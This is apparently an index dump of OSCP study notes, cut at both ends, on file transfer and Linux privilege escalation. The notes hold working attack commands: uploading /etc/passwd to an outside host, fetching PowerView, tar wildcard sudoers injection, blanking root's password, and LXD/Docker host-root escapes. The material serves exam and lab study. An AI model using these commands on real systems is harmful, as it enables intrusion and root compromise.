one-liners from an operating system command line using the option -e.\nRuby - Download a File Transferring Files with Code\ncube111@local[/local]$ ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))' Perl - Download a File Transferring Files with Code\ncube111@local[/local]$ perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");' JavaScript JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.\nThe following JavaScript code is based on this post, and we can download a file using it. We‚Äôll create a file called wget.js and save the following content:\nCode: javascript\nvar WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\"); WinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false); WinHttpReq.Send(); BinStream = new ActiveXObject(\"ADODB.Stream\"); BinStream.Type = 1; BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody); BinStream.SaveToFile(WScript.Arguments(1)); We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.\nDownload a File Using JavaScript and cscript.exe Transferring Files with Code\nC:\\local\u003e cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1 VBScript VBScript (‚ÄúMicrosoft Visual Basic Scripting Edition‚Äù) is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.\nThe following VBScript example can be used based on this. We‚Äôll create a file called wget.vbs and save the following content:\nCode: vbscript\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\") dim bStrm: Set bStrm = createobject(\"Adodb.Stream\") xHttp.Open \"GET\", WScript.Arguments.Item(0), False xHttp.Send with bStrm .type = 1 .open .write xHttp.responseBody .savetofile WScript.Arguments.Item(1), 2 end with We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.\nDownload a File Using VBScript and cscript.exe Transferring Files with Code\nC:\\local\u003e cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1 Upload Operations using Python3 Starting the Python uploadserver Module Transferring Files with Code\ncube111@local[/local]$ python3 -m uploadserver File upload available at /upload Serving HTTP on 0.0.0.0 port 8000 Uploading a File Using a Python One-liner Transferring Files with Code\ncube111@local[/local]$ python3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})' Let‚Äôs divide this one-liner into multiple lines to understand each piece better.\nCode: python\n# To use the requests function, we need to import the module first. import requests # Define the target URL where we will upload the file. URL = \"http://192.168.49.128:8000/upload\" # Define the file we want to read, open it and save it in a variable. file = open(\"/etc/passwd\",\"rb\") # Use a requests POST request to upload the file. r = requests.post(url,files={\"files\":file})",
    "description": "Python Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. Python can run one-liners from an operating system command line using the option -c. Let‚Äôs see some examples:\nPython 2 - Download Transferring Files with Code\ncube111@local[/local]$ python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")' Python 3 - Download Transferring Files with Code\ncube111@local[/local]$ python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")' PHP PHP is also very prevalent and provides multiple file transfer methods.",
    "tags": [],
    "title": "Transferring Files with Code",
    "uri": "/oscp-notes/transferring-files-with-code/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "/etc/crontab /etc/cron.d /var/spool/cron/crontabs/root",
    "description": "/etc/crontab /etc/cron.d /var/spool/cron/crontabs/root",
    "tags": [],
    "title": "privilige escalation",
    "uri": "/oscp-notes/privilige-escalation/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "File Systems \u0026 Additional Drives Introduction to Linux Privilege Escalation\ncube111@local[/local]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 30G 0 disk ‚îú‚îÄsda1 8:1 0 29G 0 part / ‚îú‚îÄsda2 8:2 0 1K 0 part ‚îî‚îÄsda5 8:5 0 975M 0 part [SWAP] sr0 11:0 1 848M 0 rom Find Writable Directories Introduction to Linux Privilege Escalation\ncube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2\u003e/dev/null /dmz-backups /tmp /tmp/VMwareDnD /tmp/.XIM-unix /tmp/.Test-unix /tmp/.X11-unix /tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp /tmp/.font-unix /tmp/.ICE-unix /proc /dev/mqueue /dev/shm /var/tmp /var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp /var/crash /run/lock Find Writable Directories Introduction to Linux Privilege Escalation\ncube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2\u003e/dev/null /dmz-backups /tmp /tmp/VMwareDnD /tmp/.XIM-unix /tmp/.Test-unix /tmp/.X11-unix /tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp /tmp/.font-unix /tmp/.ICE-unix /proc /dev/mqueue /dev/shm /var/tmp /var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp /var/crash /run/lock find / -path /mnt -prune -o -type d -writable 2\u003e/dev/null Gaining Situational Awareness whoami - what user are we running as id - what groups does our user belong to? hostname - what is the server named, can we gather anything from the naming convention? ifconfig or ip a - what subnet did we land in, does the host have additional NICs in other subnets? sudo -l - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like sudo su and drop right into a root shell. cube111@local[/local]$ cat /etc/os-release NAME=\"Ubuntu\" VERSION=\"20.04.4 LTS (Focal Fossa)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 20.04.4 LTS\" VERSION_ID=\"20.04\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=focal cube111@local[/local]$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin cube111@local[/local]$ env SHELL=/bin/bash PWD=/home/local-student LOGNAME=local-student XDG_SESSION_TYPE=tty MOTD_SHOWN=pam HOME=/home/local-student LANG=en_US.UTF-8 Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux cube111@local[/local]$ lscpu Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian Address sizes: 43 bits physical, 48 bits virtual CPU(s): 2 On-line CPU(s) list: 0,1 Thread(s) per core: 1 Core(s) per socket: 2 Socket(s): 1 NUMA node(s): 1 Vendor ID: AuthenticAMD CPU family: 23 Model: 49 Model name: AMD EPYC 7302P 16-Core Processor Stepping: 0 CPU MHz: 2994.375 BogoMIPS: 5988.75 Hypervisor vendor: VMware \u003cSNIP\u003e cube111@local[/local]$ cat /etc/shells # /etc/shells: valid login shells /bin/sh /bin/bash /usr/bin/bash /bin/rbash /usr/bin/rbash /bin/dash /usr/bin/dash /usr/bin/tmux cube111@local[/local]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop0 7:0 0 55M 1 loop /snap/core18/1705 loop1 7:1 0 69M 1 loop /snap/lxd/14804 loop2 7:2 0 47M 1 loop /snap/snapd/16292 loop3 7:3 0 103M 1 loop /snap/lxd/23339 loop4 7:4 0 62M 1 loop /snap/core20/1587 loop5 7:5 0 55.6M 1 loop /snap/core18/2538 sda 8:0 0 20G 0 disk ‚îú‚îÄsda1 8:1 0 1M 0 part ‚îú‚îÄsda2 8:2 0 1G 0 part /boot ‚îî‚îÄsda3 8:3 0 19G 0 part ‚îî‚îÄubuntu--vg-ubuntu--lv 253:0 0 18G 0 lvm / cube111@local[/local]$ cat /etc/fstab # /etc/fstab: static file system information. # # Use \"blkid\" to print the universally unique identifier for a # device; this may be used with UUID= as a more robust way to name devices # that works even if disks are added and removed. See fstab(5). # # \u003cfile system\u003e \u003cmount point\u003e \u003ctype\u003e \u003coptions\u003e \u003cdump\u003e \u003cpass\u003e # / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation /dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0 # /boot was on /dev/sda2 during curtin installation cube111@local[/local]$ route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface default _gateway 0.0.0.0 UG 0 0 0 ens192 10.129.0.0 0.0.0.0 255.255.0.0 U 0 0 0 ens192 cube111@local[/local]$ cat /etc/group root:x:0: daemon:x:1: bin:x:2: sys:x:3: adm:x:4:syslog,local-student tty:x:5:syslog disk:x:6: lp:x:7: mail:x:8: news:x:9: uucp:x:10: man:x:12: proxy:x: cube111@local[/local]$ getent group sudo sudo:x:27:mrb3n Unmounted File Systems Environment Enumeration\ncube111@local[/local]$ cat /etc/fstab | grep -v \"#\" | column -t UUID=5bf16727-fcdf-4205-906c-0620aa4a058f / ext4 errors=remount-ro 0 1 UUID=BE56-AAE0 /boot/efi vfat umask=0077 0 1 /swapfile none swap sw All Hidden Files Environment Enumeration\ncube111@local[/local]$ find / -type f -name \".*\" -exec ls -l {} \\; 2\u003e/dev/null | grep local-student -rw-r--r-- 1 local-student local-student 3771 Nov 27 11:16 /home/local-student/.bashrc -rw-rw-r-- 1 local-student local-student 180 Nov 27 11:36 /home/local-student/.wget-hsts -rw------- 1 local-student local-student 387 Nov 27 14:02 /home/local-student/.bash_history -rw-r--r-- 1 local-student local-student 807 Nov 27 11:16 /home/local-student/.profile -rw-r--r-- 1 local-student local-student 0 Nov 27 11:31 /home/local-student/.sudo_as_admin_successful -rw-r--r-- 1 local-student local-student 220 Nov 27 11:16 /home/local-student/.bash_logout -rw-rw-r-- 1 local-student local-student 162 Nov 28 13:26 /home/local-student/.notes cube111@local[/local]$ find / -type d -name \".*\" -ls 2\u003e/dev/null 684822 4 drwx------ 3 local-student local-student 4096 Nov 28 12:32 /home/local-student/.gnupg 790793 4 drwx------ 2 local-student local-student 4096 Okt 27 11:31 /home/local-student/.ssh 684804 4 drwx------ 10 local-student local-student 4096 Okt 27 11:30 /home/local-student/.cache 790827 4 drwxrwxr-x 8 local-student local-student 4096 Okt 27 11:32 /home/local-student/CVE-2021-3156/.git 684796 4 drwx------ 10 local-student local-student 4096 Okt 27 11:30 /home/local-student/.config 655426 4 drwxr-xr-x 3 local-student local-student 4096 Okt 27 11:19 /home/local-student/.local 524808 4 drwxr-xr-x 7 gdm Cheat Sheet The cheat sheet is a useful command reference for this module.\nCommand Description ssh local-student@\u003ctarget IP\u003e SSH to lab target `ps aux grep root` ps au See logged in users ls /home View user home directories ls -l ~/.ssh Check for SSH keys for current user history Check the current user‚Äôs Bash history sudo -l Can the user run anything as another user? ls -la /etc/cron.daily Check for daily Cron jobs lsblk Check for unmounted file systems/drives find / -path /proc -prune -o -type d -perm -o+w 2\u003e/dev/null Find world-writeable directories find / -path /proc -prune -o -type f -perm -o+w 2\u003e/dev/null Find world-writeable files uname -a Check the Kernel versiion cat /etc/lsb-release Check the OS version gcc kernel_expoit.c -o kernel_expoit Compile an exploit written in C screen -v Check the installed version of Screen ./pspy64 -pf -i 1000 View running processes with pspy find / -user root -perm -4000 -exec ls -ldb {} \\; 2\u003e/dev/null Find binaries with the SUID bit set find / -user root -perm -6000 -exec ls -ldb {} \\; 2\u003e/dev/null Find binaries with the SETGID bit set sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root Priv esc with tcpdump echo $PATH Check the current user‚Äôs PATH variable contents PATH=.:${PATH} Add a . to the beginning of the current user‚Äôs PATH find / ! -path \"*/proc/*\" -iname \"*config*\" -type f 2\u003e/dev/null Search for config files ldd /bin/ls View the shared objects required by a binary sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart Escalate privileges using LD_PRELOAD `readelf -d payroll grep PATH` gcc src.c -fPIC -shared -o /development/libshared.so Compiled a shared libary lxd init Start the LXD initialization process lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine Import a local image lxc init alpine r00t -c security.privileged=true Start a privileged LXD container lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true Mount the host file system in a container lxc start r00t Start the container showmount -e 10.129.2.12 Show the NFS export list sudo mount -t nfs 10.129.2.12:/tmp /mnt Mount an NFS share locally tmux -S /shareds new -s debugsess Created a shared tmux session socket ./lynis audit system Perform a system audit with Lynis Installed Packages [!bash!]$ apt list --installed | tr \"/\" \" \" | cut -d\" \" -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list Listing... accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1 accountsservice 0.6.55-0ubuntu12~20.04.5 acl 2.2.53-6 acpi-support 0.143 acpid 2.0.32-1ubuntu1 adduser 3.118ubuntu2 adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2 alsa-base 1.0.25+dfsg-0ubuntu5 alsa-topology-conf 1.2.2-1 alsa-ucm-conf 1.2.2-1ubuntu0.13 alsa-utils 1.2.2-1ubuntu2.1 amd64-microcode 3.20191218.1ubuntu1 anacron 2.3-29 Credential Hunting local_student@NIX02:~$ cat wp-config.php | grep 'DB_USER|DB_PASSWORD' define( 'DB_USER', 'wordpressuser' ); define( 'DB_PASSWORD', 'WPadmin123!' ); The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).\nCredential Hunting\nlocal_student@NIX02:~$ find / ! -path \"*/proc/*\" -iname \"*config*\" -type f 2\u003e/dev/null /etc/ssh/ssh_config /etc/ssh/sshd_config /etc/python3/debian_config /etc/kbd/config /etc/manpath.config /boot/config-4.4.0-116-generic /boot/grub/i386-pc/configfile.mod /sys/devices/pci0000:00/0000:00:00.0/config /sys/devices/pci0000:00/0000:00:01.0/config \u003cSNIP\u003e SSH Keys It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the known_hosts file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.\nCredential Hunting\nlocal_student@NIX02:~$ ls ~/.ssh id_rsa id_rsa.pub known_hosts Path Abuse local_student@NIX02:~$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games Path Abuse\nlocal_student@NIX02:~$ PATH=.:${PATH} local_student@NIX02:~$ export PATH local_student@NIX02:~$ echo $PATH Wildcard Abuse Consider the following cron job, which is set up to back up the /home/local-student directory‚Äôs contents and create a compressed archive within /home/local-student. The cron job is set to run every minute, so it is a good candidate for privilege escalation.\nWildcard Abuse\n# # mh dom mon dow command */01 * * * * cd /home/local-student \u0026\u0026 tar -zcf /home/local-student/backup.tar.gz * We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.\nWildcard Abuse\nlocal-student@NIX02:~$ echo 'echo \"local-student ALL=(root) NOPASSWD: ALL\" \u003e\u003e /etc/sudoers' \u003e root.sh local-student@NIX02:~$ echo \"\" \u003e \"--checkpoint-action=exec=sh root.sh\" local-student@NIX02:~$ echo \"\" \u003e --checkpoint=1 Escaping Restricted Shells 2Ô∏è‚É£ Command Substitution cube111@local[/local]$ ls -l `pwd` 3Ô∏è‚É£ Command Chaining Use shell metacharacters to chain commands:\nbash\nCopyEdit\nls -l ; id\nThe semicolon ; allows execution of id after ls. Other chaining operators:\nOperator Meaning ; Run multiple commands sequentially \u0026\u0026 Run second command only if first succeeds 4Ô∏è‚É£ Environment Variables Abuse 4Ô∏è‚É£ Environment Variables Abuse Modify environment variables to bypass restrictions.\nExample: If the restricted shell uses a specific PATH:\nbash\nCopyEdit\nPATH=/your/path:$PATHexport PATH\nInsert malicious binaries or scripts earlier in PATH. 5Ô∏è‚É£ Shell Functions Define functions that wrap restricted commands with additional commands.\nExample:\nbash\nCopyEdit\nfunction ls() { /bin/ls; /bin/bash; }\nCalling ls triggers both ls and spawns an unrestricted shell. Summary ‚úÖ Always test:\nCommand injection ($( ), backticks)\nChaining (;, \u0026\u0026, ||)\nEnvironment variable manipulation\nShell function redefinitions\n‚úÖ Restricted shells are often poorly implemented and easy to bypass with creativity.\nüìå Linux Special Permissions: setuid, setgid, and GTFOBins üîç Concept Explanation Set User ID (setuid) Allows a user to execute a file with the file owner‚Äôs privileges.\nTypically used to temporarily grant root privileges for certain binaries.\nWhen set, the file permissions show s for the owner execute bit (rws).\nExploitable if:\nThe binary has unintended features.\nThe binary can be abused to execute arbitrary code.\nSet Group ID (setgid) Similar to setuid, but applies to group ownership.\nExecutes the file as if you are part of the group that owns the file.\nPermissions show s for the group execute bit (rwsr-sr-x).\nüíª SUID Enumeration Commands bash\nCopyEdit\nfind / -user root -perm -4000 -exec ls -ldb {} \\; 2\u003e/dev/null\nfind / -perm -u=s -type f 2\u003e/dev/null\nSyntax Explanation:\n/ : Search entire filesystem.\n-user root : Owned by root.\n-perm -4000 : Files with SUID set.\n-exec ls -ldb {} \\; : List full details of found files.\n2\u003e/dev/null : Suppress permission denied errors.\nüî¨ Example Output swift\nCopyEdit\n-rwsr-xr-x 1 root root 16728 /home/local-student/shared_obj_hijack/payroll-rwsr-xr-x 1 root root 40152 /bin/mount-rwsr-xr-x 1 root root 54256 /usr/bin/passwd...\nüíª SGID Enumeration Commands bash\nCopyEdit\nfind / -user root -perm -6000 -exec ls -ldb {} \\; 2\u003e/dev/null\nSyntax Explanation:\n-perm -6000 : Search for both setuid (4000) and setgid (2000) files together.\nRest is same as above.\nüî¨ Example Output swift\nCopyEdit\n-rwsr-sr-x 1 root root 85832 /usr/lib/snapd/snap-confine\nüõ° Privilege Escalation via SUID/SGID Reverse engineer custom binaries (e.g., payroll, netracer) for vulnerabilities.\nMany default system binaries are safe (e.g., passwd, su), but check for version-specific exploits.\nCombine with GTFOBins to check for abuse opportunities.\nüìå GTFOBins Curated database of Linux binaries that can be exploited for:\nPrivilege Escalation\nRestricted shell escape\nReverse shells\nFile transfers\nWebsite:\nhttps://gtfobins.github.io\nüíª GTFOBins Sudo Example (apt-get) bash\nCopyEdit\nsudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh\nSyntax Explanation:\nsudo : Run as root.\napt-get update : Executes update.\n-o APT::Update::Pre-Invoke::=/bin/sh : Before running update, execute /bin/sh as root.\nüî¨ Output Example bash\nCopyEdit\n# iduid=0(root) gid=0(root) groups=0(root)\n‚ö† Notes Always manually review unusual SUID/SGID binaries.\nGTFOBins is extremely helpful for live exam scenarios.\nMemorize common binaries: vim, less, nano, awk, perl, python, tar, find, cp, rsync, etc.\nSudo Rights Abuse local_student@NIX02:~$ sudo -l Matching Defaults entries for sysadm on NIX02: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User sysadm may run the following commands on NIX02: (root) NOPASSWD: /usr/sbin/tcpdump local_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root dropped privs to root tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes Maximum file limit reached: 1 1 packet captured 6 packets received by filter compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied 0 packets dropped by kernel üìå Privileged Groups Exploitation (OSCP) üîç Concept Explanation Certain Linux groups grant indirect root-like privileges.\nIf user is a member of these groups, they may escalate privileges using group-specific capabilities.\nAlways check group memberships using:\nbash\nCopyEdit\nid\nExample:\nbash\nCopyEdit\ndevops@NIX02:~$ iduid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)\nüîß Group: lxd (Linux Containers) üîç Why dangerous lxd allows managing containers.\nMember can create privileged containers which map container root ‚Üí host root.\nüíª Exploitation Steps 1Ô∏è‚É£ Extract the LXD image: bash\nCopyEdit\nunzip alpine.zipcd 64-bit\\ Alpine/\n2Ô∏è‚É£ Initialize LXD (use defaults): bash\nCopyEdit\nlxd init\nExample answers:\nStorage backend: dir\nNetwork: no\nLXD bridge: yes\n3Ô∏è‚É£ Import image: bash\nCopyEdit\nlxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine\n4Ô∏è‚É£ Create privileged container: bash\nCopyEdit\nlxc init alpine r00t -c security.privileged=true\n5Ô∏è‚É£ Mount host file system inside container: bash\nCopyEdit\nlxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true\n6Ô∏è‚É£ Start container: bash\nCopyEdit\nlxc start r00t\n7Ô∏è‚É£ Spawn shell inside container: bash\nCopyEdit\nlxc exec r00t /bin/sh\n8Ô∏è‚É£ Verify root access: bash\nCopyEdit\niduid=0(root) gid=0(root)\nüîç Example: access host root file system: bash\nCopyEdit\ncd /mnt/root/rootcat /mnt/root/etc/shadow\nüîß Group: docker üîç Why dangerous Full filesystem access via container volumes.\nDocker containers can mount host directories, exposing root files.\nüíª Exploitation Example bash\nCopyEdit\ndocker run -v /root:/mnt -it ubuntu /bin/bash\nExplanation: -v /root:/mnt ‚Üí Mount host /root dir inside container.\nInside container:\nbash\nCopyEdit\ncd /mntcat .ssh/authorized_keys\nSame technique can be used to access /etc/shadow for password hashes. üîß Group: disk üîç Why dangerous Full access to block devices under /dev (e.g. /dev/sda1).\nEntire file system can be read directly.\nüíª Exploitation Example (using debugfs): bash\nCopyEdit\nsudo debugfs /dev/sda1\nInside debugfs: bash\nCopyEdit\nlscd /rootcat .ssh/authorized_keys\nCan retrieve sensitive files or add SSH keys. üîß Group: adm üîç Why dangerous Can read system logs in /var/log.\nCan expose:\nCredentials accidentally logged.\nRunning cron jobs.\nCommand history.\nApplication errors with sensitive data.\nüíª Exploitation Example bash\nCopyEdit\ncd /var/logcat auth.logcat mysql/error.logcat cron.log\nüîê Key OSCP Takeaway Always check group memberships ‚Äî lxd, docker, disk, and adm may allow privilege escalation even without full sudo access. üìå Linux Capabilities Exploitation (OSCP) üîç Concept Explanation Linux capabilities break the all-or-nothing root privilege model.\nCapabilities allow assigning specific privileges to binaries.\nBinaries can perform restricted actions without full root permissions.\nIf misused, capabilities can lead to privilege escalation.\nüîß Setting Capabilities Command bash\nCopyEdit\nsudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic\nSyntax Explanation Part Meaning setcap set capabilities cap_net_bind_service capability name +ep effective \u0026 permitted privileges /usr/bin/vim.basic target binary üîß Common Dangerous Capabilities Capability Description cap_sys_admin Broad admin privileges (almost full root) cap_sys_chroot Change root directory cap_sys_ptrace Debug and attach to other processes cap_sys_nice Change process priority cap_sys_time Modify system clock cap_sys_resource Modify system resource limits cap_sys_module Load/unload kernel modules cap_net_bind_service Bind to low TCP ports cap_setuid Change effective user ID cap_setgid Change effective group ID cap_dac_override Bypass file permission checks üîß Capability Values Value Description = Clear capability +ep Effective \u0026 Permitted privileges +ei Effective \u0026 Inheritable privileges +p Permitted only üîß Enumerating Capabilities Search capabilities across common bin dirs: bash\nCopyEdit\nfind /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;\nsecaudit@NIX02:$ getcap / -r 2\u003e/dev/null\n/usr/bin/mtr-packet = cap_net_raw+ep\nsecaudit@NIX02:$\nOutput Example: bash\nCopyEdit\n/usr/bin/vim.basic cap_dac_override=eip/usr/bin/ping cap_net_raw=ep/usr/bin/mtr-packet cap_net_raw=ep\nüîß Exploiting cap_dac_override cap_dac_override allows bypassing file read/write permission checks. 1Ô∏è‚É£ Confirm capability on vulnerable binary: bash\nCopyEdit\ngetcap /usr/bin/vim.basic\nOutput:\nbash\nCopyEdit\n/usr/bin/vim.basic cap_dac_override=eip\n2Ô∏è‚É£ Modify /etc/passwd using vim.basic: bash\nCopyEdit\n/usr/bin/vim.basic /etc/passwd\nYou now have write access to /etc/passwd without being root. 3Ô∏è‚É£ Modify root account to remove password: bash\nCopyEdit\necho -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd\nExplanation:\nReplace password hash field with empty (root::).\n-es ‚Üí non-interactive mode.\n4Ô∏è‚É£ Verify: bash\nCopyEdit\ncat /etc/passwd | head -n1\nExpected output:\nruby\nCopyEdit\nroot::0:0:root:/root:/bin/bash\n5Ô∏è‚É£ Switch to root with no password: bash\nCopyEdit\nsu -\nüõ° OSCP Pro Tip Any capability that allows writing files, changing EUID, or bypassing permission checks is extremely dangerous and should be reviewed immediately when found.\nüìå Cron Job Abuse (OSCP Privilege Escalation) üîç Concept Cron jobs run scheduled tasks automatically.\nMisconfigured cron jobs may allow low-privileged users to escalate privileges if:\nThey can modify scripts run by cron.\nThe cron job runs as root.\nThe modified scripts contain injected payloads.\nüîß Crontab Syntax (OSCP quick rule) Field Meaning Minute 0‚Äì59 Hour 0‚Äì23 Day of month 1‚Äì31 Month 1‚Äì12 Day of week 0‚Äì7 Command The command to run ‚úÖ Example:\nbash\nCopyEdit\n0 */12 * * * /home/admin/backup.sh\nRuns every 12 hours.\n‚úÖ Misconfigured Example:\nbash\nCopyEdit\n*/3 * * * * /home/admin/backup.sh\nRuns every 3 minutes.\nüîß Finding Cron Jobs to Abuse 1Ô∏è‚É£ Search for world-writable files (potential targets): bash\nCopyEdit\nfind / -path /proc -prune -o -type f -perm -o+w 2\u003e/dev/null\n‚úÖ Output example:\nbash\nCopyEdit\n/etc/cron.daily/backup/dmz-backups/backup.sh/home/backupsvc/backup.sh\n2Ô∏è‚É£ Observe file timestamps Notice backup files being created every few minutes: bash\nCopyEdit\nls -la /dmz-backups/\n‚úÖ Example:\nmakefile\nCopyEdit\nwww-backup-2020831-02:24:01.tgzwww-backup-2020831-02:27:01.tgz...\nThis suggests the cron job runs frequently (every 3 minutes). 3Ô∏è‚É£ Monitor real-time cron activity using pspy bash\nCopyEdit\n./pspy64 -pf -i 1000\nüìå LXD / LXC Privilege Escalation (Containers) üîç What are containers? Containers Virtual Machines Share same kernel Full separate kernel Lightweight Heavy Process-level isolation Full hardware-level isolation Easy to abuse if misconfigured Harder to abuse ‚úÖ Containers = isolated environment running inside host OS kernel.\nüìå Why is this a privilege escalation vector? If you‚Äôre part of the lxd or lxc group:\nYou can control container instances.\nContainers can mount host file systems.\nMisconfigured containers allow full root access to the host.\n‚úÖ This is post-exploitation gold if you land inside any user with LXD rights.\nüìå Check group membership bash\nCopyEdit\nid\n‚úÖ If you see lxd or lxc group, you‚Äôre likely exploitable:\nsql\nCopyEdit\nuid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)\nüìå The attack chain 1Ô∏è‚É£ Find existing container templates: bash\nCopyEdit\nls\n‚úÖ Example:\ncpp\nCopyEdit\nubuntu-template.tar.xz\n2Ô∏è‚É£ Import image: bash\nCopyEdit\nlxc image import ubuntu-template.tar.xz --alias ubuntutemp\n3Ô∏è‚É£ Verify image import: bash\nCopyEdit\nlxc image list\n4Ô∏è‚É£ Initialize privileged container ‚úÖ Critical part: disable isolation\nbash\nCopyEdit\nlxc init ubuntutemp privesc -c security.privileged=true\nThis allows container to fully access host kernel features. 5Ô∏è‚É£ Mount host root filesystem inside container bash\nCopyEdit\nlxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n‚úÖ This mounts host‚Äôs / directory inside the container at /mnt/root/.\n6Ô∏è‚É£ Start container bash\nCopyEdit\nlxc start privesc\n7Ô∏è‚É£ Get shell inside container bash\nCopyEdit\nlxc exec privesc /bin/bash\n‚úÖ You are now root inside container with access to mounted host filesystem.\n8Ô∏è‚É£ Access host filesystem as root bash\nCopyEdit\ncd /mnt/rootls -la\n‚úÖ You can now modify host files, edit /etc/passwd, add users, drop SSH keys ‚Äî full root.\nüìå OSCP One-Liner Summary for Joplin: LXD/LXC allows privileged containers to mount host filesystem. If you‚Äôre in lxd group, you can escalate to host root by creating a privileged container, mounting / and modifying host system directly.\nüìå Full One-Shot Attack Flow (for your Joplin): bash\nCopyEdit\n# Check for lxd group membershipid# Import existing template imagelxc image import ubuntu-template.tar.xz --alias ubuntutemp# Initialize privileged containerlxc init ubuntutemp privesc -c security.privileged=true# Mount host filesystemlxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true# Start containerlxc start privesc# Enter container shelllxc exec privesc /bin/bash# Access host filesystemcd /mnt/root\nid lxc image import ubuntu-template.tar.xz --alias ubuntutemp lxc init ubuntutemp privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc -- /bin/bash cd /mnt/root Docker # ‚úÖ Check if you're in docker group id # ‚úÖ List Docker images docker image ls # ‚úÖ List Docker containers docker ps -a # ‚úÖ Mount host filesystem \u0026 escape to host root via chroot (main privesc one-liner) docker run -v /:/mnt --rm -it ubuntu chroot 